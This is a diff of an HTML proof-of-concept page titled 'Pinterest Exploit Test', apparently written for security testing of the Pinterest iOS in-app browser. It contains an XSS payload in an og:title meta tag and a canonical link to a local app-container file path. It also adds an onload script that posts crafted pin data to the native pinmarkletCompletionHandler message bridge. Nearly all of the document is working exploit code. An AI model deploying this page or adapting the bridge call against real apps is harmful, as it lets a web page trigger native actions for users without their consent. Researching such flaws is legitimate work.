@@ -124,7 +124,26 @@ window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
     <meta property="og:title" content='"><img src=x onerror=alert("OG XSS")>'>
     <link rel="canonical" href="file:///private/var/mobile/Containers/Data/Application/DE1F2730-70D5-4898-AA09-B584FBCDEC23/Documents/activeUser">
   </head>
-  <body>
+  <body onload="sendPinmarkletCompletion()">
     <h1>Pinterest Exploit Test</h1>
+
+    <script>
+      function sendPinmarkletCompletion() {
+        try {
+          const data = {
+            board_id: "813392451390315106",
+            color: "#bf8f97",
+            description: "Test JS Bridges Exploit",
+            method: "in_app_browser",
+            found_metadata: "{}",
+            source_url: "https://www.google.com/search?sca_esv=699dcbf54c4bfee5&sxsrf=AE3TifPJXejwKxs9RBP4Y6vOeAdU70BNYw:1754149668208&udm=2&fbs=AIIjpHxU7SXXniUZfeShr2fp4giZ1Y6MJ25_tmWITc7uy4KIeoJTKjrFjVxydQWqI2NcOhYPURIv2wPgv_w_sE_0Sc6Q_7Pv7l13oPoHoSfb2CeJ8t1fSmckdcdNkml3G8t1-YMMAzLRnU0yofJKjKlfKtbXTnHgKOoThKRt8DOHSuxqCK-70hGNJI33_eQtE8uXAmbzmN7Ym46z-HaDsbxL-Xw5nR916A&q=images&sa=X&ved=2ahUKEwjI3uzevOyOAxX58wIHHdZaKcwQtKgLegQIExAB&biw=1728&bih=891&dpr=2#vhid=kt9a95Fkz4GXzM&vssid=mosaic"
+          };
+
+          window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
+        } catch (e) {
+          alert("❌ Error: " + e.message);
+        }
+      }
+    </script>
   </body>
 </html>
